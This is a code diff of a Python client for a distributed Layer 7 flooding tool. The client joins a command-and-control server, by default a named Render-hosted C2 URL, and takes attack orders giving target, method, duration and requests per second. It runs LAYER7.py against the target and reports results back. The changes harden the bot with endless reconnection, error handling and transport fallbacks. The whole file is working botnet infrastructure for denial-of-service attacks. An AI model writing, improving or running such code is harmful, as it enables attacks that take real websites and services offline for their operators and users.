@@ -17,11 +17,9 @@ from datetime import datetime
 
 # Try to import actual LAYER7.py
 try:
-    # If LAYER7.py is in the same directory
     import LAYER7
     HAS_LAYER7 = True
 except ImportError:
-    # Create a simulation
     HAS_LAYER7 = False
     print("[!] LAYER7.py not found, using simulation mode")
 
@@ -31,7 +29,17 @@ class Layer7Client:
     def __init__(self, server_url='http://localhost:5000', client_name=None):
         self.server_url = server_url
         self.client_name = client_name or f"{platform.node()}_{platform.system()}"
-        self.sio = socketio.Client()
+        
+        # Configure SocketIO client with better settings for Render
+        self.sio = socketio.Client(
+            reconnection=True,
+            reconnection_attempts=0,  # Infinite retries
+            reconnection_delay=1,
+            reconnection_delay_max=5,
+            logger=False,
+            engineio_logger=False
+        )
+        
         self.current_attack = None
         self.running = False
         self.attack_thread = None
@@ -60,10 +68,12 @@ class Layer7Client:
         @self.sio.event
         def connect_error(data):
             print(f"❌ Connection failed: {data}")
+            print("💡 Retrying connection...")
         
         @self.sio.event
         def disconnect():
             print("❌ Disconnected from server")
+            print("🔄 Attempting to reconnect...")
             self.running = False
         
         @self.sio.event
@@ -86,8 +96,11 @@ class Layer7Client:
     
     def register_client(self):
         """Register client with server"""
-        self.sio.emit('client_register', self.client_info)
-        print(f"✅ Registered as: {self.client_name}")
+        try:
+            self.sio.emit('client_register', self.client_info)
+            print(f"✅ Registered as: {self.client_name}")
+        except Exception as e:
+            print(f"⚠️ Registration error: {e}")
     
     def start_attack(self, attack_data):
         """Start attack execution"""
@@ -104,10 +117,13 @@ class Layer7Client:
         self.attack_thread.start()
         
         # Notify server
-        self.sio.emit('attack_started', {
-            'attack_id': attack_data.get('attack_id'),
-            'target': attack_data.get('target')
-        })
+        try:
+            self.sio.emit('attack_started', {
+                'attack_id': attack_data.get('attack_id'),
+                'target': attack_data.get('target')
+            })
+        except Exception as e:
+            print(f"⚠️ Failed to notify server: {e}")
     
     def execute_attack(self, attack_data):
         """Execute LAYER7.py attack"""
@@ -126,30 +142,30 @@ class Layer7Client:
             print(f"   RPS: {rps}")
             print(f"{'='*60}\n")
             
-            # Start time
             start_time = time.time()
             
-            # Run LAYER7.py
             if HAS_LAYER7:
                 results = self.run_actual_layer7(target, method, duration, rps)
             else:
                 results = self.run_simulation(target, method, duration, rps)
             
-            # Calculate stats
             elapsed = time.time() - start_time
             actual_rps = results.get('requests', 0) / elapsed if elapsed > 0 else 0
             
             # Report completion
-            self.sio.emit('attack_complete', {
-                'attack_id': attack_id,
-                'results': {
-                    'requests': results.get('requests', 0),
-                    'success': results.get('success_rate', 0),
-                    'rps': actual_rps,
-                    'duration': elapsed,
-                    'method': method
-                }
-            })
+            try:
+                self.sio.emit('attack_complete', {
+                    'attack_id': attack_id,
+                    'results': {
+                        'requests': results.get('requests', 0),
+                        'success': results.get('success_rate', 0),
+                        'rps': actual_rps,
+                        'duration': elapsed,
+                        'method': method
+                    }
+                })
+            except Exception as e:
+                print(f"⚠️ Failed to report completion: {e}")
             
             print(f"\n✅ Attack completed in {elapsed:.1f}s")
             print(f"   Requests: {results.get('requests', 0):,}")
@@ -158,10 +174,13 @@ class Layer7Client:
             
         except Exception as e:
             print(f"\n❌ Attack error: {str(e)}")
-            self.sio.emit('attack_error', {
-                'attack_id': attack_id,
-                'error': str(e)
-            })
+            try:
+                self.sio.emit('attack_error', {
+                    'attack_id': attack_id,
+                    'error': str(e)
+                })
+            except:
+                pass
         finally:
             self.running = False
             self.current_attack = None
@@ -169,35 +188,23 @@ class Layer7Client:
     def run_actual_layer7(self, target, method, duration, rps):
         """Run actual LAYER7.py tool"""
         try:
-            # Create a script that calls LAYER7.py with parameters
             script = f"""
 import sys
 import os
 
-# Add current directory to path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-# Import and run LAYER7
 import LAYER7
 
-# Since LAYER7.py has interactive input, we need to simulate it
-# This depends on how LAYER7.py is structured
-
-# Option 1: If LAYER7.py has a main() function
 if hasattr(LAYER7, 'main'):
-    # Backup sys.argv
     old_argv = sys.argv
-    
-    # Set parameters
     sys.argv = ['LAYER7.py', '--target', '{target}', '--method', '{method}', 
                 '--duration', '{duration}', '--rps', '{rps}']
-    
     try:
         LAYER7.main()
     finally:
         sys.argv = old_argv
 
-# Option 2: If LAYER7.py has NetworkLayerTester class
 elif hasattr(LAYER7, 'NetworkLayerTester'):
     tester = LAYER7.NetworkLayerTester(
         target='{target}',
@@ -205,22 +212,15 @@ elif hasattr(LAYER7, 'NetworkLayerTester'):
         requests_per_second={rps},
         duration={duration}
     )
-    
-    # Run attack
     tester.execute_enhanced_attack()
-    
-    # Return results
     requests = len(tester.results) if hasattr(tester, 'results') else 0
     success = len([r for r in tester.results if r.get('success', False)]) if hasattr(tester, 'results') else 0
-    
     print(f"LAYER7 Results: {{requests}} requests, {{success}} successful")
-
 else:
     print("LAYER7.py structure not recognized")
     print("Available in LAYER7 module:", dir(LAYER7))
 """
             
-            # Execute the script
             result = subprocess.run(
                 [sys.executable, '-c', script],
                 capture_output=True,
@@ -228,29 +228,15 @@ else:
                 timeout=duration + 30
             )
             
-            # Parse output
             output = result.stdout
             
-            # Extract results from output
-            requests = 0
-            success_rate = 0
-            
-            # Try to find numbers in output
             import re
             numbers = re.findall(r'\d+', output)
-            if numbers:
-                requests = int(numbers[0]) if len(numbers) > 0 else 0
-            
-            # If LAYER7 has results attribute
-            if hasattr(LAYER7, 'NetworkLayerTester'):
-                # We can't access it from here since it was in subprocess
-                # Use default values
-                requests = rps * duration
-                success_rate = 85
+            requests = int(numbers[0]) if numbers else rps * duration
             
             return {
                 'requests': requests,
-                'success_rate': success_rate
+                'success_rate': 85
             }
             
         except subprocess.TimeoutExpired:
@@ -266,33 +252,34 @@ else:
         
         total_requests = 0
         start_time = time.time()
+        last_progress = 0
         
-        while time.time() - start_time < duration:
-            # Simulate requests
-            batch_size = min(rps, 1000)  # Max 1000 requests per batch
+        while time.time() - start_time < duration and self.running:
+            batch_size = min(rps, 1000)
             total_requests += batch_size
             
-            # Send progress update every 5 seconds
             elapsed = time.time() - start_time
-            if int(elapsed) % 5 == 0 and elapsed > 1:
+            if elapsed - last_progress >= 5:
                 current_rps = total_requests / elapsed
-                self.sio.emit('attack_progress', {
-                    'requests': total_requests,
-                    'rps': current_rps,
-                    'elapsed': elapsed
-                })
+                try:
+                    self.sio.emit('attack_progress', {
+                        'requests': total_requests,
+                        'rps': current_rps,
+                        'elapsed': elapsed
+                    })
+                except:
+                    pass
                 print(f"[SIM] Progress: {total_requests:,} requests, {current_rps:.1f} RPS")
+                last_progress = elapsed
             
-            # Small delay
             time.sleep(0.01)
         
-        # Calculate final stats
         elapsed = time.time() - start_time
         actual_rps = total_requests / elapsed if elapsed > 0 else 0
         
         return {
             'requests': total_requests,
-            'success_rate': 92,  # Simulated success rate
+            'success_rate': 92,
             'rps': actual_rps
         }
     
@@ -308,8 +295,7 @@ else:
         """Report statistics to server"""
         while True:
             try:
-                if self.sio.connected and self.running:
-                    # Get system stats
+                if self.sio.connected and not self.running:
                     cpu_usage = psutil.cpu_percent(interval=1)
                     memory_usage = psutil.virtual_memory().percent
                     
@@ -321,7 +307,7 @@ else:
                     
                     self.sio.emit('client_stats', {'stats': stats})
                 
-                time.sleep(5)  # Report every 5 seconds
+                time.sleep(10)
             except:
                 time.sleep(10)
     
@@ -338,10 +324,19 @@ else:
             print(f"🔧 LAYER7.py: {'✅ Available' if HAS_LAYER7 else '❌ Using simulation'}")
             print("="*60 + "\n")
             
-            print("⚡ Press Ctrl+C to disconnect")
-            print("📡 Waiting for attack commands from server...\n")
+            print("⚡ Connecting...")
+            print("📡 This may take 10-30 seconds for Render servers...")
             
-            self.sio.connect(self.server_url)
+            # Try to connect with timeout
+            self.sio.connect(
+                self.server_url,
+                wait_timeout=30,
+                transports=['websocket', 'polling']  # Try both transports
+            )
+            
+            print("\n✅ Connection successful!")
+            print("📡 Waiting for attack commands from server...")
+            print("⚡ Press Ctrl+C to disconnect\n")
             
             # Start stats reporting
             stats_thread = threading.Thread(target=self.report_stats, daemon=True)
@@ -355,18 +350,25 @@ else:
             print("\n🛑 Client stopped by user")
             self.disconnect()
         except Exception as e:
-            print(f"❌ Connection error: {str(e)}")
+            print(f"\n❌ Connection error: {str(e)}")
+            print("\n💡 Troubleshooting tips:")
+            print("   1. Check if server URL is correct")
+            print("   2. Make sure server is running (Render may need time to wake up)")
+            print("   3. Check your internet connection")
+            print("   4. Try again in 30 seconds if server was sleeping")
             self.disconnect()
     
     def disconnect(self):
         """Disconnect from server"""
         self.running = False
         if self.sio.connected:
-            self.sio.disconnect()
+            try:
+                self.sio.disconnect()
+            except:
+                pass
 
 def main():
     """Main function"""
-    # Get server URL from user
     print("""
     ╔══════════════════════════════════════╗
     ║    LAYER7 DISTRIBUTED CLIENT        ║
@@ -375,12 +377,15 @@ def main():
     ╚══════════════════════════════════════╝
     """)
     
-    # Default to Render URL if available
     default_server = "https://c2-server-io.onrender.com"
     
     server_url = input(f"🌐 C2 Server URL [{default_server}]: ").strip()
     if not server_url:
         server_url = default_server
+    
+    # Ensure URL has protocol
+    if not server_url.startswith('http'):
+        server_url = 'https://' + server_url
     
     client_name = input(f"🏷️  Client Name [{platform.node()}]: ").strip()
     if not client_name:
